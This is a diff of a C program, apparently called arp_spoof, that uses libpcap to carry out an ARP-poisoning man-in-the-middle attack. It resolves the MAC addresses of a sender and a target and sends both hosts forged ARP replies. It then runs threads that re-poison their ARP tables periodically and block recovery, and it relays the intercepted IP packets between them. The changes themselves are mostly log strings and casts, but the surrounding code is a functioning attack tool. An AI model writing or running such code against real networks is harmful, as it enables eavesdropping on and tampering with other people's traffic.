@@ -2,7 +2,7 @@
 
 #include "functions.h"
 
-// send_arp <interface> <sender ip> <target ip>
+// ./arp_spoof <interface> <sender ip> <target ip>
 
 int main(int argc, char *argv[])
 {
@@ -64,7 +64,7 @@ int main(int argc, char *argv[])
 	MAKE_ARPREQ_STRUCT(arp_request, attacker_MAC_array, attacker_IP_int, sender_IP_int);
 	do
 	{
-		if (pcap_sendpacket(handle, (uint8_t *)arp_request, sizeof(my_etharp_hdr))) { pcap_perror(handle, "pcap_sendpacket error"); }
+		if (pcap_sendpacket(handle, (uint8_t *)arp_request, sizeof(my_etharp_hdr))) { pcap_perror(handle, (char *)"pcap_sendpacket error"); }
 		if(GET_SENDER_MAC(sender_MAC_array, sender_IP_int, handle, header, packet)) { break; }
 	} while(1);
 	printf("[Sender   MAC Address] "); PRINT_MAC(sender_MAC_array); puts("\n");
@@ -76,7 +76,7 @@ int main(int argc, char *argv[])
 	MAKE_ARPREQ_STRUCT(arp_request, attacker_MAC_array, attacker_IP_int, target_IP_int);
 	do
 	{
-		if(pcap_sendpacket(handle, (uint8_t *)arp_request, sizeof(my_etharp_hdr))) { pcap_perror(handle, "pcap_sendpacket error"); }
+		if(pcap_sendpacket(handle, (uint8_t *)arp_request, sizeof(my_etharp_hdr))) { pcap_perror(handle, (char *)"pcap_sendpacket error"); }
 		if(GET_SENDER_MAC(target_MAC_array, target_IP_int, handle, header, packet)) { break; }
 	} while(1);
 	printf("[Target   MAC Address] "); PRINT_MAC(target_MAC_array); puts("\n");
@@ -95,15 +95,17 @@ int main(int argc, char *argv[])
 	memcpy(info->arp_reply2sender, (uint8_t *)arp_reply2sender, sizeof(my_etharp_hdr));
 	memcpy(info->arp_reply2target, (uint8_t *)arp_reply2target, sizeof(my_etharp_hdr));
 
-	if (pcap_sendpacket(handle, (uint8_t *)arp_reply2sender, sizeof(my_etharp_hdr))) { pcap_perror(handle, "pcap_sendpacket error"); }
+	if (pcap_sendpacket(handle, (uint8_t *)arp_reply2sender, sizeof(my_etharp_hdr))) { pcap_perror(handle, (char *)"[- INIT -] pcap_sendpacket error"); }
 	else { puts("[  INIT  ] sender <- attacker    target"); }
-	if (pcap_sendpacket(handle, (uint8_t *)arp_reply2target, sizeof(my_etharp_hdr))) { pcap_perror(handle, "pcap_sendpacket error"); }
+	if (pcap_sendpacket(handle, (uint8_t *)arp_reply2target, sizeof(my_etharp_hdr))) { pcap_perror(handle, (char *)"[- INIT -] pcap_sendpacket error"); }
 	else { puts("[  INIT  ] sender    attacker -> target"); }
 	puts(""); 
 
+	puts("[+] Sent initial fake ARP packets to poison sender and target's ARP table for the first time\n");
+
 // Extra level of assurance
 	pthread_create(&tid1, NULL, SEND_ARP, (void *)info);
-	puts("[+] Initiated thread, periodically (10s) poisoning arp table\n");
+	printf("[+] Initiated thread, periodically (%ds) poisoning arp table\n\n", SEND_ARP_PERIOD);
 
 	pthread_create(&tid2, NULL, BLOCK_RECOVERY, (void *)info);
 	puts("[+] Initiated thread, blocking arp table recovery\n");
@@ -166,7 +168,7 @@ int main(int argc, char *argv[])
 			// Relay IP packets
 			memcpy(((my_etharp_hdr *)n_packet)->DMAC, target_MAC_array, 6 * sizeof(uint8_t));
 			memcpy(((my_etharp_hdr *)n_packet)->SMAC, attacker_MAC_array, 6 * sizeof(uint8_t));
-			if (pcap_sendpacket(handle, (uint8_t *)n_packet, header->caplen)) { pcap_perror(handle, "pcap_sendpacket error"); }
+			if (pcap_sendpacket(handle, (uint8_t *)n_packet, header->caplen)) { pcap_perror(handle, (char *)"[- RLAY -] pcap_sendpacket error"); }
 			else { puts("[  RLAY  ] sender -> attacker -> target"); }
 		}
 
@@ -175,7 +177,7 @@ int main(int argc, char *argv[])
 			// Relay IP packets
 			memcpy(((my_etharp_hdr *)n_packet)->DMAC, sender_MAC_array, 6 * sizeof(uint8_t));
 			memcpy(((my_etharp_hdr *)n_packet)->SMAC, attacker_MAC_array, 6 * sizeof(uint8_t));
-			if (pcap_sendpacket(handle, (uint8_t *)n_packet, header->caplen)) { pcap_perror(handle, "pcap_sendpacket error"); }
+			if (pcap_sendpacket(handle, (uint8_t *)n_packet, header->caplen)) { pcap_perror(handle, (char *)"[- RLAY -] pcap_sendpacket error"); }
 			else { puts("[  RLAY  ] sender <- attacker <- target"); }
 		}
 
